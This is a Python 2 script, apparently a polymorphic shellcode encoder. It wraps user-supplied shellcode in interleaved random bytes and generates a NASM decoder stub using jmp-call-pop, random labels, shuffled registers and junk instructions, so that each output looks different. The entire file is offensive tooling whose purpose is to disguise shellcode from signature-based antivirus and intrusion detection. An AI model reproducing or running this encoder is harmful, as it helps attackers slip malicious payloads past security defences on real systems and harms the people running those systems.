#!/usr/bin/python

import sys
import string
import random

# polymorphic alphabet
assembler = ""
jmpListNeutral = ["std", "cld", "stc", "clc"]
jmpListInstructions = ["mov", "xor", "sub", "add"]
jmpListRegisters = ["eax", "ebx", "ecx", "edx", "esi", "edi"]
callListNeutral = ["std", "cld", "stc", "clc"]
callListInstructions = ["mov", "xor", "sub", "add"]
callListRegisters = ["eax", "ebx", "ecx", "edx", "esi", "edi"]
unusedRegisters = ["eax", "ebx", "ecx", "edx"]
commonRegisters = ["eax", "ebx", "ecx", "edx"]


def jmpPoly(count):
	ass = ""
        for i in range(count):
                tmpRand = random.randint(0, 1)
                if tmpRand == 0:
                        command = random.randint(0, len(jmpListNeutral)-1)
                        ass += "\t" + jmpListNeutral[command] + "\n"
                else:
                        command = random.randint(0, len(jmpListInstructions)-1)
                        source = random.randint(0, len(jmpListRegisters)-1)
                        destination = random.randint(0, len(jmpListRegisters)-1)
                        ass += "\t" + jmpListInstructions[command] + " " + jmpListRegisters[destination] + ", " + jmpListRegisters[source] + "\n"
	return ass

def callPoly(count):
        ass = ""
	for i in range(count):
                tmpRand = random.randint(0, 1)
                if tmpRand == 0:
                        command = random.randint(0, len(callListNeutral)-1)
                        ass += "\t" + callListNeutral[command] + "\n"
                else:
                        command = random.randint(0, len(callListInstructions)-1)
                        source = random.randint(0, len(callListRegisters)-1)
                        destination = random.randint(0, len(callListRegisters)-1)
                        ass += "\t" + callListInstructions[command] + " " + callListRegisters[destination] + ", " + callListRegisters[source] + "\n"

	return ass


if len(sys.argv) < 2:
	sys.exit('Usage: %s [<shellcode>|<shellcode_file>]' % sys.argv[0])
else:
	# stopping Byte declaration
	stoppingByte = hex(random.randint(1, 255))
	# load shell from a file
	if len(sys.argv) > 2:
        	if sys.argv[1] == '-f':
			file = open(sys.argv[2], "r")
        		content = file.read()
        		content = content.strip(" \t\n\r")
			content = content.decode("string_escape")
        		file.close()
	# direct shell input
	else:
		content = sys.argv[1].decode("string_escape")

	input = ""
	originalShellcodeLength = 0
	for x in bytearray(content):
		originalShellcodeLength += 1
		input += hex(x)
		if originalShellcodeLength == len(bytearray(content)):
			input += ", " + str(stoppingByte)
			break
		while True:
                	tmpByte = hex(random.randint(1, 255))
                        if tmpByte != stoppingByte and tmpByte != hex(x):
                        	input += ", " + str(tmpByte) + ", "
                                break

	print "[+] Encoding original shellcode (" + str(originalShellcodeLength) + " Bytes)..."
	# generate assembler procedure names and variables
	# save shellcode variable
	randomString = [random.choice(string.ascii_letters) for n in xrange(10)]
	shellcodeLabel = "".join(randomString)
        shellcode = shellcodeLabel + ": db " + input + "\n"
	# generate call_shellcode label 
	randomString = [random.choice(string.ascii_letters) for n in xrange(10)]
	callShellcode = "".join(randomString)
	# generate decoder label
	randomString = [random.choice(string.ascii_letters) for n in xrange(10)]
	decoder = "".join(randomString)
	# generate decode label
	randomString = [random.choice(string.ascii_letters) for n in xrange(10)]
	decode = "".join(randomString)

	# define which register is used for what
	tmp = random.randint(0, len(unusedRegisters)-1)
	insertIterator = unusedRegisters.pop(tmp)
	tmp = random.randint(0, len(unusedRegisters)-1)
	tmpValue = unusedRegisters.pop(tmp)
	unusedRegisters.append("esi")
	unusedRegisters.append("edi")
	tmp = random.randint(0, len(unusedRegisters)-1)
	popRegister = unusedRegisters.pop(tmp)
	tmp = random.randint(0, len(unusedRegisters)-1)
	shellIterator = unusedRegisters.pop(tmp) 

	# build the assembler file string
	print "[+] Building mutated decoder-snippet..."
	assembler += "global _start\n"
	assembler += "section .text\n"
	assembler += "_start:\n"
	# use jmp-call-pop technique
	# jmp part... some polymorphic stuff
	# poly in jmp before
	jmpBeforeOrders = random.randint(0, 3)
	assembler += jmpPoly(jmpBeforeOrders)
	# execute jmp
	assembler += "\tjmp " + callShellcode + "\n"
	# poly after jmp
	jmpAfterOrders = random.randint(0, 3)
	assembler += jmpPoly(jmpAfterOrders)
	insertIteratorLowerByte = ""
	if 'a' in insertIterator:
		insertIteratorLowerByte = "al"
	if 'b' in insertIterator:
                insertIteratorLowerByte = "bl"
	if 'c' in insertIterator:
                insertIteratorLowerByte = "cl"
	if 'd' in insertIterator:
                insertIteratorLowerByte = "dl"
	tmpValueLowerByte = ""
	if 'a' in tmpValue:
		tmpValueLowerByte = "al"
	if 'b' in tmpValue:
                tmpValueLowerByte = "bl"
	if 'c' in tmpValue:
                tmpValueLowerByte = "cl"
	if 'd' in tmpValue:
                tmpValueLowerByte = "dl" 
	# access decoder procedure
	assembler += decoder + ":\n"
	assembler += "\tpop " + popRegister + "\n"
        assembler += "\tlea " + shellIterator + ", [" + popRegister + "+1]\n"
	tmpRand = random.randint(0, 1)
	tmpRegister = random.randint(0, len(commonRegisters)-1)
	if tmpRand == 0:
		assembler += "\tmov " + insertIterator + ", " + commonRegisters[tmpRegister] + "\n"
	assembler += "\txor " + insertIterator + ", " + insertIterator + "\n"
	assembler += "\tmov " + insertIteratorLowerByte + ", 0x1\n"
	tmpRand = random.randint(0, 1)
        tmpRegister = random.randint(0, len(commonRegisters)-1)
        if tmpRand == 0:
                assembler += "\tmov " + tmpValue + ", " + commonRegisters[tmpRegister] + "\n"
	assembler += "\txor " + tmpValue + ", " + tmpValue + "\n"
	# access decode procedure
	assembler += decode + ":\n"
	assembler += "\tmov " + tmpValueLowerByte + ", byte [" + popRegister + " + " + insertIterator + "]\n"
	assembler += "\txor " + tmpValueLowerByte + ", " + stoppingByte + "\n"
	assembler += "\tjz short " + shellcodeLabel + "\n"
	assembler += "\tmov " + tmpValueLowerByte + ", byte [" + popRegister + " + " + insertIterator + " + 1]\n"
	assembler += "\tmov byte [" + shellIterator + "], " + tmpValueLowerByte + "\n"
	tmpRand = random.randint(0, 1)
	if tmpRand == 0:
		assembler += "\tinc " + shellIterator + "\n"
	else:
		# CAUTION: possible overflow
		assembler += "\tadd " + shellIterator + ", 1\n"
	tmpRand = random.randint(0, 1)
	if tmpRand == 0:
		# CAUTION: possible overflow!
		assembler += "\tadd " + insertIteratorLowerByte + ", 2\n"
	else:
		assembler += "\tinc " + insertIteratorLowerByte + "\n"
		assembler += "\tinc " + insertIteratorLowerByte + "\n"
	assembler += "\tjmp short " + decode + "\n"
	# access call shellcode procedure
	assembler += callShellcode + ":\n"
	# poly before call
	callBeforeOrders = random.randint(0, 3)
	assembler += callPoly(callBeforeOrders)
	# execute call
	assembler += "\tcall " + decoder + "\n"
	# add shellcode
	assembler += "\t" + shellcode
	callAfterOrders = random.randint(0, 3)     
	assembler += callPoly(callAfterOrders)

	# save the assembler file
	print "[+] Saving the black magic into an assembler file..."
	file = open("tmp.nasm", "w")
	file.write(assembler)
	file.close()
